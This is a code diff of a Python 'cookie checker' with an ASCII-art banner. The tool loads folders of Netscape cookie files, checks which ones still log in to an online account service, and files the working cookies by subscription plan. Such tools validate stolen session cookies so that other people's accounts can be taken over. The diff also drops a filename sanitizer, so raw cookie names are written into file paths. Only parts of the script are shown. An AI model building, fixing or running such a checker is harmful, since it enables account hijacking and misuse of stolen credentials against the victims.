@@ -1,15 +1,11 @@
-import sys
+import requests
 import os
 import colorama
-import requests
 import tkinter as tk
 from tkinter import filedialog
 import threading
 
 colorama.init(autoreset=True)
-
-# Set stdout encoding to UTF-8 explicitly
-sys.stdout.reconfigure(encoding='utf-8')
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -36,7 +32,6 @@ def format_cookie_file(data, cookie_content):
     return header + cookie_content
 
 def ask_for_cookie_folder():
-    # Create Tkinter root window and hide it
     root = tk.Tk()
     root.withdraw()
 
@@ -48,10 +43,6 @@ def ask_for_cookie_folder():
         return ask_for_cookie_folder()
     
     return cookie_folder
-
-def sanitize_filename(filename):
-    # Sanitize the filename to remove invalid characters
-    return "".join([c if c.isalnum() or c in (' ', '_', '-') else '_' for c in filename])
 
 def checkNetscapeCookies(cookie_folder, num_threads=1):
     counts = {'hits': 0, 'bad': 0, 'errors': 0}
@@ -80,20 +71,16 @@ def checkNetscapeCookies(cookie_folder, num_threads=1):
                     current_plan = data.get("currentPlan", "unknown")
 
                     counts['hits'] += 1
-                    try:
-                        print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)
-                    except UnicodeEncodeError:
-                        print(f"Login successful with {cookie}")  # Print without color if there's an issue
+                    print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)
 
                     # Creating a folder structure in the "hits" folder based on the plan name
                     output_folder = plan_name_mapping(current_plan).replace(" ", "_").lower()
                     hits_folder = os.path.join(os.getcwd(), "hits", output_folder)
                     os.makedirs(hits_folder, exist_ok=True)
 
-                    # Save the cookie to the corresponding folder
+                    # Saving the cookie to the corresponding folder with UTF-8 encoding
                     formatted_cookie = format_cookie_file(data, read_cookie)
-                    cookie_filename = sanitize_filename(cookie)
-                    with open(os.path.join(hits_folder, cookie_filename), 'w', encoding='utf-8') as out_f:
+                    with open(os.path.join(hits_folder, f"{cookie}.txt"), 'w', encoding='utf-8') as out_f:
                         out_f.write(formatted_cookie)
 
                 else:
@@ -134,14 +121,14 @@ def checkNetscapeCookies(cookie_folder, num_threads=1):
 def main():
     clear_screen()
 
-    # ASCII art
-    print("""
+    print(""" 
 ██████╗░░█████╗░██╗░░░██╗███████╗███╗░░██╗  ██╗░░██╗  ███████╗██████╗░██████╗░░█████╗░██╗░░██╗
 ██╔══██╗██╔══██╗██║░░░██║██╔════╝████╗░██║  ╚██╗██╔╝  ██╔════╝██╔══██╗╚════██╗██╔══██╗██║░██╔╝
 ██████╔╝███████║╚██╗░██╔╝█████╗░░██╔██╗██║  ░╚███╔╝░  █████╗░░██████╔╝░█████╔╝███████║█████═╝░
 ██╔══██╗██╔══██║░╚████╔╝░██╔══╝░░██║╚████║  ░██╔██╗░  ██╔══╝░░██╔══██╗░╚═══██╗██╔══██║██╔═██╗░
 ██║░░██║██║░░██║░░╚██╔╝░░███████╗██║░╚███║  ██╔╝╚██╗  ██║░░░░░██║░░██║██████╔╝██║░░██║██║░╚██╗
-╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝""")
+╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝
+    """)
 
     # Ask for folder and threads
     cookie_folder = ask_for_cookie_folder()
